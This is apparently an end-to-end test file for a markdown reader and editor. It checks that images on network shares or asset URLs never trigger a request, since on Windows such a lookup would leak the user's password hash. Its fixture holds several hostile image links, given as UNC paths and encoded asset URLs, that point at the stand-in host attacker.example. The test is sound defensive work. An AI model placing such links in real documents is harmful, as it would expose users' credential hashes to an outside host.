// A document can name a picture on a network share or a URL the app itself
// serves (the asset protocol). On Windows looking such a picture up signs
// in to the share with the user's password hash, so neither the reader
// nor the editor may ask for one; an ordinary picture still shows.
import { test, expect } from './support/test';

const PATH = '/e2e/docs/pictures.md';
const MD = [
  '# Pictures',
  '',
  '![asset](http://asset.localhost/%5C%5Cattacker.example%5Cs%5Cpixel.png)',
  '',
  '![other host](http://asset.attacker.example/%5C%5Cattacker.example%5Cs%5Cpixel.png)',
  '',
  '![share](//attacker.example/s/x.png)',
  '',
  '![drive](\\\\\\\\attacker.example\\s\\x.png)',
  '',
  '![fine](pics/fine.png)',
  '',
].join('\n');

test('neither the reader nor the editor asks for an unsafe picture', async ({ page }) => {
  const asked: string[] = [];
  page.on('request', (r) => asked.push(r.url()));
  await page.goto('/');
  await page.evaluate(() => (window as any).__E2E_CLEAR_ALL__?.());
  await page.evaluate(([p, md]) => (window as any).__E2E_SEED_DOC__(p, md), [PATH, MD]);
  await page.evaluate((p) => (window as any).__E2E_SET_DIALOG_PATH__(p), PATH);
  await page.getByRole('button', { name: /menu/i }).click();
  await page.getByRole('menuitem', { name: /open…/i }).click();
  await page.getByRole('heading', { level: 1 }).waitFor();

  const reader = page.locator('.viewer img');
  await expect(reader).toHaveCount(5);
  for (const alt of ['asset', 'other host', 'share', 'drive']) {
    await expect(page.locator(`.viewer img[alt="${alt}"]`)).toHaveAttribute('src', '');
  }
  await expect(page.locator('.viewer img[alt="fine"]')).toHaveAttribute('src', 'asset://localhost//e2e/docs/pics/fine.png');

  await page.locator('.edit-mode-toggle').click();
  const editor = page.locator('.editor-surface .editor-image img');
  await expect(editor).toHaveCount(5);
  for (const alt of ['asset', 'other host', 'share', 'drive']) {
    await expect(page.locator(`.editor-surface .editor-image img[alt="${alt}"]`)).toHaveAttribute('src', '');
  }
  await expect(page.locator('.editor-surface .editor-image img[alt="fine"]')).toHaveAttribute('src', 'asset://localhost//e2e/docs/pics/fine.png');

  await page.waitForTimeout(300);
  expect(asked.filter((u) => /attacker|asset\.localhost/i.test(u))).toEqual([]);
});
